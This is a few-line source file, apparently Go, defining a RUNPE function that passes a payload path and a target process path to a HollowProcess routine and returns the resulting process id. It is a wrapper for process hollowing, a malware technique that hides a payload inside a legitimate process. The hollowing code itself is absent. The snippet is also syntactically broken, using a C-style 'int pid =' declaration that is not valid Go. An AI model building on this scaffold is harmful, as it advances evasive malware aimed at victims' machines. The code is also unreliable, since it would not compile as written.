package RUNPE

func RUNPE(payloadPath string, targetPath string, arguments string) int {
	int pid = HollowProcess(payloadPath, targetPath, arguments)
	return pid
}
